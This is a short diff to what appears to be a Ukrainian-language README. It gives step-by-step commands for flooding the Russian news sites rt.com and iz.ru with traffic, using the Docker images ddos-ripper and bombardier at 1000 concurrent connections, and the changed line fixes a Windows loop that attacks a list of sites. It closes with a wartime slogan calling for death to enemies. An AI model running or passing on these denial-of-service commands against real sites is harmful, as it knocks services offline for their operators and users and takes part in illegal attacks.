@@ -8,7 +8,7 @@
 4. Запустіть наступну команду, щоб шварити www.rt.com
     docker run --rm -it nitupkcuf/ddos-ripper:latest www.rt.com
 5. Запустіть наступну команду, щоб шварити список сайтів
-    for /l %q in (0) do for %s in ('iz.ru', 'rt.com') do docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l %s
+    for %s in (http://iz.ru/ http://rt.com/) do docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l %s
 6. Щоб призупинити зашквар і трохи провітрити хату натисніть Ctrl+C
 
 Слава Україні! Смерть ворогам!
